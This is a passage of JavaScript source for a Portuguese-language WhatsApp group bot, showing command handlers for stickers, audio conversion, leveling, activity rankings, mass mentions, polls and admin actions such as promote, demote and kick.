pl.sendMessage(from, {image: buff}, {quoted: selo}).catch(e => {
console.log(e);
reply('ERROR!!')
})
break

case 'tomp3':
if ((isMedia && !info.message.imageMessage || isQuotedVideo)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.videoMessage
reply(enviar.espere)
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane 
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => { 
fs.unlinkSync(media)
if (err) return reply('‚ùå Falha ao converter v√≠deo para mp3 ‚ùå')
buffer = fs.readFileSync(ran)
pl.sendMessage(from, {audio: buffer, mimetype: 'audio/mp4'}, {quoted: selo})
fs.unlinkSync(ran)
})
} else {
reply("Marque o v√≠deo para transformar em √°udio por favor..")
}
break

//========FINAL DAS STICKER=============



//==========(TTPS/ATTP/TTM)============\\

case 'exx1':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`Estou fazendo seu attp aguarde... `)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp1?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await pl.sendMessage(from, {sticker: uuu}, {quoted: selo})
break

case 'exx2':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`Estou fazendo seu attp aguarde... `)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp2?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await pl.sendMessage(from, {sticker: uuu}, {quoted: selo})
break

case 'exx3':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`Estou fazendo seu attp aguarde... `)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp3?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await pl.sendMessage(from, {sticker: uuu}, {quoted: selo})
break

case 'exx4':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`Estou fazendo seu attp aguarde... `)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp4?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await pl.sendMessage(from, {sticker: uuu}, {quoted: selo})
break

case 'exx5':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`Estou fazendo seu attp aguarde... `)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp5?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await pl.sendMessage(from, {sticker: uuu}, {quoted: selo})
break

case 'exx6':
if (args.length < 1) return reply(`Use dessa forma:\nComando: ${prefix}attp ${pushname} gado`)
reply (`Estou fazendo seu attp aguarde... `)

uuu = await getBuffer(`https://api.brizaloka-api.tk/ttp/attp6?apikey=brizaloka&text=${encodeURIComponent(body.slice(6))}`)
await pl.sendMessage(from, {sticker: uuu}, {quoted: selo})
break

case 'ttp':
try {
enviarbutao(from,`Fazendo ttp...`,`${NomeDoBot}`,
[{index: 5, quickReplyButton: {displayText: '[ü©∏] obrigado [ü©∏]', id: ``}}], selo)

string = args.join(' ') || 'Texto indefinido'
post = `https://api.brizaloka-api.tk/ttp/ttp1?apikey=brizaloka&text=${string}`
sendStickerFromUrl(from, {sticker: post}, {quoted: selo})
} catch {
reply('ERROR!!')
}
break

case 'attp':
 sections = [
    {
	title: ` ${NomeDoBot}`,
	rows: [
	    {title: "[ü©∏] ùêÑùêíùêìùêàùêãùêé ùüè [ü©∏] ", rowId: `${prefix}exx1 ${q}`},
	    {title: "[ü©∏] ùêÑùêíùêìùêàùêãùêé ùüê [ü©∏] ", rowId: `${prefix}exx2 ${q}`},	    
	    {title: "[ü©∏] ùêÑùêíùêìùêàùêãùêé ùüë [ü©∏] ", rowId: `${prefix}exx3 ${q}`},
	    {title: "[ü©∏] ùêÑùêíùêìùêàùêãùêé ùüí [ü©∏] ", rowId: `${prefix}exx4 ${q}`},
	    {title: "[ü©∏] ùêÑùêíùêìùêàùêãùêé ùüì [ü©∏] ", rowId: `${prefix}exx5 ${q}`},
	    {title: "[ü©∏] ùêÑùêíùêìùêàùêãùêé ùüî [ü©∏] ", rowId: `${prefix}exx6 ${q}`}
	    	]
    },
]
 
listMessage = {
  text: `Resultados Para [  ${q}  ]`,
  footer: "",
  title: "Estilos de Attp's",
  buttonText: " ü©∏ ESCOLHER ü©∏ ",
  sections
}
pl.sendMessage(from, listMessage, {quoted: selo})
break	


//======================================\\


//========COMANDOS DE GRUPO=============

case 'status':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins && !SoDono  && !m.key.fromMe) return reply(enviar.msg.adm)
statuszada =
`‚ï≠‚ïº‚ïº‚ïæ‚ù≤ S T A T U S ‚ù≥‚ïº‚ïº‚ïæ‚ïÆ
‚îÇ‚û± Anti √°udios: ${isAntiAudio? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti documentos: ${Antidoc ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti fake: ${isAntifake ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti img: ${isAntiImg? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti sticker: ${isAntiSticker ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti liga√ß√£o: ${isAnticall ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti Notas: ${isAntiNotas ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti catalogo: ${isAnticatalogo ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti video: ${isAntiVid ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti localiza√ß√£o: ${Antiloc ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti pv block: ${isAntiPv ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti link hard: ${isAntiLinkHard ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Anti link grupo: ${isAntilinkgp ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Auto ban lista negra: ${isAdeusCara ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Nsfw: ${isNsfw ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Limite caracteres: ${isAntiFlood ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Simih: ${isSimi ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Bem vindo: ${isWelkom ? '‚úÖ' : '‚õî'}
‚îÇ‚û± Bem vindo 2: ${isWelkom2 ? '‚úÖ' : '‚õî'}
‚ï∞‚ïº‚ïæ‚ù≤ ${NomeDoBot} ‚ù≥‚ïº‚ïæ‚ïØ`
wew = await getBuffer(`${logo}`)
pl.sendMessage(from, {image: wew, caption: statuszada, thumbnail: null})
break


case 'leveling':
if (!isGroup) return reply('S√≥ em Grupo')
if (!isGroupAdmins) return reply('Voc√™ precisa ser adm')
if (args.length < 1) return reply('Ative pressione 1, Desativar pressione 0')
if (Number(args[0]) === 1) {
if (isLevelingOn) return reply('*O recurso de n√≠vel j√° estava ativo antes*')
leveling.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/leveling.json', JSON.stringify(leveling))
reply(enviar.levelon) 
} else if (Number(args[0]) === 0) {
if (!isLevelingOn) return reply(`O recurso de level j√° est√° Desativado neste grupo.`)
leveling.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/leveling.json', JSON.stringify(leveling))
reply(enviar.leveloff)
} else {
reply('„Äå* Adicionar par√¢metro 1 ou 0 ')
}
break

case 'ganharlevel':
if(!SoDono) return reply("Voc√™ n√£o √© dono para utilizar este comando...")
addLevelingLevel(sender, 5000)
reply("Ol√° chefe, foi adicionado 5000 mil Level para voc√™ üôÇ")
break

case 'ganharxp':
if(!SoDono) return reply("Voc√™ n√£o √© dono para utilizar este comando...")  
addLevelingXp(sender, 5000)
reply("Foi adicionado 5000 mil de XP para voc√™ üôÇ")
break

case 'level':
if (!isLevelingOn) return reply(`*O recurso de level est√° Desativado, para ativar consulte algum adm e mande ele digitar : ${prefix}leveling 1`)
if (!isGroup) return reply(enviar.msg.grupo)
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return reply(enviar.levelnol)
sem = sender.replace('@s.whatsapp.net','')
resul = `     
*‚ï≠‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[üóØ]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïÆ*
         [ü©∏] *REGISTRO* [üö©]  
*‚ï∞‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[üí´]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïØ*       

_ALCANCE O NIVEL MAIS AUTO QUE VC CONSEGUI_

  ‚îú‚îÄ [üóØ] *USU√ÅRIO:* : ${pushname}
  ‚îú‚îÄ *[üí´] *N√öMERO* : ${sender.split("@")[0]}
  ‚îú‚îÄ *[üíô] PATENTE:* : ${patt} 
  ‚îú‚îÄ *[üí¨] XP* : ${userXp}
  ‚îî‚îÄ *[üòé] LEVEL* : ${userLevel}`
await pl.sendMessage(from, {text: resul}, {quoted: m})
.catch(async (err) => {
console.error(err)
await reply(`Error!\n${err}`)
})
break



case 'ranklevel':
case 'rl':
case 'rank':
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let leaderboardlvl = '    üèÜ„Ää Rank Niveis „ÄãüèÜ\n\n'
let nom = 0
try {
for (let i = 0; i < 10; i++) {
nom++
leaderboardlvl += `
‚îè ‚úòüåñ ${NomeDoBot} üåò‚úò‚îì
‚îÉ‚Ä¢‚îÄ‚îÄ‚îÄ‚îÄ‚Ä¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚Ä¢‚îÄ‚îÄ‚îÄ‚Ä¢
‚î£‚ù≤üèÜ‚ù≥ [${nom}] œü‚û† ${_level[i].id.replace('@s.whatsapp.net', '')}
‚î£‚ù≤üèÜ‚ù≥„Äåxp„Äç: œü${_level[i].xp}
‚î£‚ù≤üèÜ‚ù≥„ÄåLevel„Äç :œü‚û† ${_level[i].level}
‚îó ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ„Äå‚òÖ„Äç‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îö\n`

}
leaderboardlvl += `√ó‚Ä¢-‚Ä¢-‚Ä¢‚üÆ üèÜRanking LevelüèÜ‚üØ‚Ä¢-‚Ä¢-‚Ä¢√ó`
pl.sendMessage(from, {text: leaderboardlvl, sendEphemeral: true}, {quoted: selo})
} catch (err) {
console.error(err)
await reply(`Deve conter 10 pessoas com level, e o leveling deve est√° ativado para que aconte√ßa a evolu√ß√£o de level dos membros, ap√≥s as intera√ß√µes`)
}
break


case 'linkgp':
case 'linkgroup':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
 let metadata = await pl.groupMetadata(from)
linkgc = await pl.groupInviteCode(from)
reply(` ${metadata.participants.length ? metadata.participants.length : "undefined"} PARTICIPANTES DO GRUPO \n\n\n LINK DO GRUPO \n \n ${groupMetadata.subject} : \n https://chat.whatsapp.com/`+linkgc)
break

case 'modonsfw':
case 'nsfw':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isNsfw) return reply('O modo nsfw j√° est√° ativo')
nsfw.push(from)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`‚úìAtivado com sucesso o modo nsfw +18 no grupo\`\`\` *${groupMetadata.subject}*`)
} else if (Number(args[0]) === 0) {
if (!isNsfw) return reply('O modo nsfw j√° est√° Desativado')  
nsfw.splice(from, 1)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`‚úìModo Nsfw +18 desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
reply('1 para ativar, 0 para desligar')
}
break 

case 'del': case 'delete': case 'd': {
if (!isPremium && !isGroupAdmins && !SoDono) return reply(enviar.msg.premium)
if (!quoted) return
let { chat, fromMe, id } = quoted
pl.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case 'delete': case 'd': {
if (!quoted) return
let { chat, fromMe, id } = m.quoted
pl.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
reply(`MSG APAGADA!!`)
break

case 'apagar':
pl.sendMessage(from, { delete: {remoteJid:m.chat,id: m.quoted.id, participant:m.quoted.sender }})
break

case 'listonline': case 'lista-online': {
if (!isGroup) return reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
let liston = 1
pl.sendText(from, '     „Äå lista Online „Äç\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break


case 'msg': {
if (!SoDono) return reply(mess.owner)
if (!args.join(" ")) return reply(`Exemplo :\n${prefix + command} 21958xxxx|ol√°`)
const cpes = args.join(" ")
const nony = cpes.split("|")[0];
const pesny = cpes.split("|")[1];
lolh = `*| MSG DO MEU DONO |*

Mensagem do administrador de bots
N√∫mero : wa.me/${m.sender.split("@")[0]}
Mensagem : ${pesny}`
pl.sendMessage(nony + "@s.whatsapp.net", {text:lolh, mentions:[sender]}, {quoted:selo})
}
await reply("Sucesso")
break


case 'tagall':
case 'marcar': {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
 let metadata = await pl.groupMetadata(from)
let teks = `
„Äò *üë• MARCANDO TODOS üôÇ* „Äô
\n ${metadata.participants.length ? metadata.participants.length : "undefined"} participantes do grupo
\n ‚û≤ *Mensagem : ${args.join(" ") ? args.join(" ") : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `‚îÉ‚ùñ‚îÇ @${mem.id.split('@')[0]}\n`
}
pl.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: selo})
}
break


case 'enquete':
if (!isGroup) return reply("apenas para grupos") 
if (!SoDono) return reply("apenas pro dono") 
if(!q) return reply(`cade o nome?`)
pl.relayMessage(from, 
{
  pollCreationMessage: {
    name: budy.slice(8).trim(),
    options: [
      { optionName: "Sim" },
      { optionName: "Talvez" },
      { optionName: "N√£o" }
      ],
    selectableOptionsCount: 1
  }
}, {})
break


case 'marcarwa':
try {
if (!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if (!isGroupAdmins && !SoDono) return reply('Voc√™ precisa ser ADM pra utilizar este comando')  
if(q.includes(`${prefix}`)) return reply("N√£o pode utilizar comandos nesse comando")
members_id = []
 let metadata = await pl.groupMetadata(from)
guxta_lindaokkk = (args.length > 1) ? body.slice(10).trim() : ''
guxta_lindaokkk += '\n\n'
for (let mem of groupMembers) {
guxta_lindaokkk += `„Äò *üë• MARCANDO TODOS üôÇ* „Äô
\n ${metadata.participants.length ? metadata.participants.length : "undefined"} participantes do grupo
\n ‚ï†‚û• https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
pl.sendMessage(from, {text: guxta_lindaokkk}, {quoted: selo})
} catch {
reply('ERROR!!')
}
break

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if (!isGroupAdmins && !SoDono) return reply('Voc√™ precisa ser ADM pra utilizar este comando')
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : m.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
pl.sendMessage(from, options)
} else if ((isMedia && !m.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
pl.sendMessage(from, {image: buff, mentions: yd}, {quoted: m})
} else if ((isMedia && !m.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
pl.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: selo})
} else if ((isMedia && !m.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
pl.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: selo})
} else if ((isMedia && !m.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? m.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : m.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
pl.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: selo})
} else if(body){
if(q.length < 1) return reply('Citar oq vey?')
pl.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`Responder imagem/documento/gif/adesivo/√°udio/v√≠deo com legenda ${prefix + command}`)
}
break


case 'promover': 
case 'promote':
if(!isGroupAdmins && !SoDono) return reply('S√≥ ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa a√ß√£o.')

if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque ou responda a mensagem de quem voc√™ quer promover')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if (botNumber.includes(mentioned)) return reply("üòë")

let responsedm = await pl.groupParticipantsUpdate(from, [mentioned], 'promote')
if (responsedm[0].status === "200") pl.sendMessage(from, {text: `@${mentioned.split("@")[0]} agora √© um fiscal do bar.Ô∏è`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsedm[0].status === "404") pl.sendMessage(from, {text: `@${mentioned.split("@")[0]} n√£o est√° no grupoÔ∏è`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else pl.sendMessage(from, {text: `Parece que deu erroÔ∏è`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
break


case "rebaixar":
        if (!isGroupAdmins) return reply(enviar.msg.adm);
        if (!isBotGroupAdmins) return reply(enviar.msg.Badmin);
        if (
          info.message.extendedTextMessage === undefined ||
          info.message.extendedTextMessage === null
        )
          return reply(
            "Marque ou responda a mensagem de quem voc√™ quer tirar o admin"
          );
        mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
          ? info.message.extendedTextMessage.contextInfo.mentionedJid[0]
          : info.message.extendedTextMessage.contextInfo.participant;
        if (botNumber.includes(mentioned))
          return reply("üòë marque outra pessoa");
        let responsepm = await pl.groupParticipantsUpdate(
          from,
          [mentioned],
          "demote"
        );
        if (responsepm[0].status === "406")
          pl.sendMessage(from, {
            text: `@${
              mentioned.split("@")[0]
            } criou esse grupo e n√£o pode ser removido(a) da lista de admins.Ô∏è`,
            mentions: [mentioned, sender],
            contextInfo: { forwardingScore: 999, isForwarded: true },
          });
        else if (responsepm[0].status === "200")
          pl.sendMessage(from, {
            text: `@${mentioned.split("@")[0]} perdeu o adm`,
            mentions: [mentioned, sender],
            contextInfo: { forwardingScore: 999, isForwarded: true },
          });
        else if (responsepm[0].status === "404")
          pl.sendMessage(from, {
            text: `@${mentioned.split("@")[0]} n√£o est√° no grupoÔ∏è`,
            mentions: [mentioned, sender],
            contextInfo: { forwardingScore: 999, isForwarded: true },
          });
        else
          pl.sendMessage(from, {
            text: `Parece que deu erroÔ∏è`,
            mentions: [sender],
            contextInfo: { forwardingScore: 999, isForwarded: true },
          });
        break;


case 'reviverqr':
case 'reiniciar':
if(!SoDono) return 
exec("cd conex√£o akame.json* && rm -rf pre-key* sender* session*")
setTimeout(async () => {
reply("Aguarde estou Reiniciando...")
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break


case 'rankativo':
case 'rankativos':  
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(mess.only.admin)
if(groupIdscount.indexOf(from) < 0) return reply('O bot n√£o tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 3) return reply('Necessita do registro de 3 usuarios')
countMessage[ind].numbers.sort((a, b) => (a.messages < b.messages) ? 1 : -1)
mentioned_jid = []
boardi = 'üó£ *Ranking dos membros mais ativos:*\n\n'
try {
for (let i = 0; i < 5; i++) {
if (i == 0) boardi += `*${i + 1}¬∫ ü•á:  @${countMessage[ind].numbers[i].id.split('@')[0]}*\n√ó Mensagens Enviadas‚ßΩ ${countMessage[ind].numbers[i].messages}\n√ó Comandos Realizados‚ßΩ ${countMessage[ind].numbers[i].cmd_messages}\n`
else if (i == 1) boardi += `*${i + 1}¬∫ ü•à: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n√ó Mensagens Enviadas‚ßΩ ${countMessage[ind].numbers[i].messages}\n√ó Comandos Realizados‚ßΩ ${countMessage[ind].numbers[i].cmd_messages}\n`
else if (i == 2) boardi += `*${i + 1}¬∫ ü•â: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n√ó Mensagens Enviadas‚ßΩ ${countMessage[ind].numbers[i].messages}\n√ó Comandos Realizados‚ßΩ ${countMessage[ind].numbers[i].cmd_messages}\n`
else if (i == 3) boardi += `*${i + 1}¬∫ ü•â: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n√ó Mensagens Enviadas‚ßΩ ${countMessage[ind].numbers[i].messages}\n√ó Comandos Realizados‚ßΩ ${countMessage[ind].numbers[i].cmd_messages}\n`	
else if (i == 4) boardi += `*${i + 1}¬∫ ü•â: @${countMessage[ind].numbers[i].id.split('@')[0]}*\n√ó Mensagens Enviadas‚ßΩ ${countMessage[ind].numbers[i].messages}\n√ó Comandos Realizados‚ßΩ ${countMessage[ind].numbers[i].cmd_messages}\n`			
				
mentioned_jid.push(countMessage[ind].numbers[i].id)
} 
mentions(boardi, mentioned_jid, true)
} catch (err) {
			console.log(err)
await pl.sendMessage(from, {text: `√â necess√°rio 5 jogadores para se construir um ranking`}, {quoted: selo})
}
break


case 'atividade':
case 'atividades':  
try{
if(!isGroupAdmins && !issupre && !ischyt) return reply(enviar.msg.adm)
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
guxta_lindaokkk = `üó£ *Atividade dos membros do grupo:*\n\n`
mem = []
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) {
var indnum = numbersIds.indexOf(obj.id)
guxta_lindaokkk += `√ó N¬∫. do Participante‚ßΩ @${obj.id.split('@')[0]}\n√ó Comandos realizados no grupo‚ßΩ ${countMessage[ind].numbers[indnum].cmd_messages}\n√ó Mensagens enviadas no grupo‚ßΩ ${countMessage[ind].numbers[indnum].messages}\n\n`
} else {
guxta_lindaokkk += `√ó N¬∫. do Participante‚ßΩ @${obj.id.split('@')[0]}\n√ó Comandos realizados no grupo‚ßΩ 0\n√ó Mensagens enviadas no grupo‚ßΩ 0\n\n`
}
mem.push(obj.id)
}
pl.sendMessage(from, {text: guxta_lindaokkk, contextInfo:{mentionedJid: mem}}, {quoted: selo})
} else return reply('*Nada foi encontrado*')
} catch (e){
console.log(e)
}
break

case 'checkativo':
  if (!isGroup) return reply(enviar.msg.grupo)
  if(!isGroupAdmins) return reply(mess.only.admin)
if(groupIdscount.indexOf(from) < 0) return reply('O bot n√£o tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque o n√∫mero que deseja puxar a atividade!')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(numbersIds.indexOf(mentioned[0]) >= 0) {
var indnum = numbersIds.indexOf(mentioned[0])
let buttons = [
{buttonId: `tchau`, buttonText: {displayText: `Obrigado ${NomeDoBot}!`}, type: 1}
]
let thumbInfo = `üèåüèª Consulta da atividade de participante no grupo:\n\n√ó Nome do Grupo‚ßΩ ${groupName}\n√ó N¬∫. Campon√™s‚ßΩ @${mentioned[0].split('@')[0]}\n√ó Mensagens enviadas no gp‚ßΩ ${countMessage[ind].numbers[indnum].messages}\n√ó Comandos realizados no gp‚ßΩ ${countMessage[ind].numbers[indnum].cmd_messages}`
blabla = await getBuffer(`${logo}`);
buttonMessage = {image: blabla, caption: `${thumbInfo}`, footer: `Solicitado por: ${pushname}`, buttons: buttons, headerType: 4}
pl.sendMessage(from, buttonMessage, {quoted: selo})
}
break

/*
case 'add':
case 'unkick':
case 'reviver':
if(!isGroupAdmins) return reply(enviar.msg.adm)
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if(!q && info.message.extendedTextMessage === null) return reply('Marque a mensagem ou coloque o n√∫mero de quem voc√™ quer adicionar no grupo')
try {
useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : info.message.extendedTextMessage.contextInfo.participant
let id = `${useradd.replace(/\D/g,'')}`
if(!id) return reply(`N√∫mero inv√°lido`)
let [result] = await pl.onWhatsApp(id)
if(!result) return reply(`Esse n√∫mero n√£o est√° registrado no WhatsApp`)
let response = await pl.groupParticipantsUpdate(from, [result.jid], "add")
if(response[0].status == "409") {
pl.sendMessage(from, {text: `Ele j√° est√° no grupo, como eu vou adicionar?`, mentions: [result.jid, sender]})
} else if(response[0].status == "403") {
pl.sendMessage(from, {text: `N√£o consegui adicionar o @${result.jid.split("@")[0]} porque ele privou a conta`, mentions: [result.jid, sender]})
} else if(response[0].status == "408") {
pl.sendMessage(from, {text: `N√£o consegui adicionar o @${result.jid.split("@")[0]} porque ele saiu recentemente do grupo.`, mentions: [result.jid, sender]})
} else if(response[0].status == "401") {
pl.sendMessage(from, {text: `N√£o consegui adicionar o @${result.jid.split("@")[0]} porque ele bloqueou o bot`, mentions: [result.jid, sender]})
} else if(response[0].status == "200") {
pl.sendMessage(from, {text: `Prontinho fiz o que voc√™ pediu`, mentions: [result.jid, sender]})
} else {
reply("Vish acho que algo deu errado")
}
} catch {
}
break

*/

case 'sairgp':
if(isGroup && !SoDono && !m.key.fromMe) return reply("Este comando s√≥ o bot ou o dono pode executar..")
try {
pl.groupLeave(from)
} catch(erro) {
reply(String(erro))
}
break


case 'ban':
case 'kick':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
tujuh = fs.readFileSync('./audios/ban1.mp3');
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@Yuri Modz", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Responda a mensagem ou marque as pessoas que voc√™ quer remover do grupo')
if(info.message.extendedTextMessage.contextInfo.participant !== null && info.message.extendedTextMessage.contextInfo.participant != undefined && info.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if(sender.includes(mentioned)) return reply("üòë")
if(botNumber.includes(mentioned)) return reply('N√£o sou besta de remover eu mesmo n√© üôÅ, mas estou decepcionado com voc√™')
if(numerodn.includes(mentioned)) return reply('N√£o posso remover meu dono üòë')

let responseb = await pl.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") pl.sendMessage(from, {text: `@${mentioned.split("@")[0]} foi removido do grupo com sucesso.Ô∏è`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
